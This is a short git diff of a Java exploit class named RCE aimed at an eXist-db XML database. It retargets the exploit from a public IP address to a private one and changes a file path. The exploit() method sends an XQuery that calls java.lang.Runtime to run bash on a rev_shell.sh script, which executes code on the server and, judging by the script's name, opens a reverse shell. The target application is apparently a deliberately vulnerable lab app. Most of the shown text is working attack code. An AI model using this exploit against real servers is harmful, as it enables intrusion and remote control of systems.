@@ -4,7 +4,7 @@ import org.xmldb.api.modules.XPathQueryService;
 
 public class RCE {
     protected static String DRIVER = "org.exist.xmldb.DatabaseImpl";
-    protected static String URI = "xmldb:exist://13.70.19.195:8080/exist/xmlrpc";
+    protected static String URI = "xmldb:exist://192.168.10.130:8080/exist/xmlrpc";
     protected static String collectionPath = "/db/vulnapp/";
     protected static String resourceName = "user.xml";
     public static Collection col = null;
@@ -24,7 +24,7 @@ public class RCE {
     }
 
     public static void  exploit() throws Exception{
-        String exploit_query = "declare namespace runtime =\"java:java.lang.Runtime\"; declare variable $rt:= runtime:get-runtime(); runtime:exec($rt, \"/bin/bash /opt/eXist-db/webapp/WEB-INF/data/fs/db/vulnapp/rev_shell.sh\")";
+        String exploit_query = "declare namespace runtime =\"java:java.lang.Runtime\"; declare variable $rt:= runtime:get-runtime(); runtime:exec($rt, \"/bin/bash /usr/local/eXist-db/webapp/WEB-INF/data/fs/db/vulnapp/rev_shell.sh\")";
         //Finding the password length
         System.out.println(query(exploit_query));
     }
